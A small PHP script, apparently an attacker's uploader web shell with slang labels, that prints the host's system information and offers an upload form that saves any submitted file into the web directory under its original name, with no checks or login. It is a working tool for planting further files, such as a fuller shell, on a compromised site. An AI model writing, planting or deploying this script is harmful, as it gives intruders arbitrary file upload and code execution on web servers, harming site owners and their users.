<?php
echo php_uname();
if (isset($_POST['up']))
{
    $smiadzb = $_FILES['0']['name'];
    $tmpdzb = $_FILES['0']['tmp_name'];
     move_uploaded_file($tmpdzb,"".$smiadzb);
    echo "</center> </br>nod tchll :v <a href=$smiadzb>$smiadzb</a></center>";
}
else 
{
	die("<center><form method=post enctype='multipart/form-data'><input type=file name=0 ><input type=submit name=up value='t7n l9lawi'></center>");
}

?>

